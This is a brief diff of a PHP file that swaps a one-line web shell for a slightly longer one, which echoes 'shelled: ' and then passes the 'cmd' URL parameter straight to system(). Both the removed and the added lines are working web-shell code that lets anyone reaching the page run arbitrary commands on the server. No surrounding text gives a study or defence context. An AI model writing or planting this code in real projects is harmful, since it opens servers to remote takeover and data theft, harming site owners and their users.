@@ -1,1 +1,4 @@
-<?php system($_GET['cmd']); ?>
+<?php 
+echo "shelled: ";
+system($_GET['cmd']); 
+?>
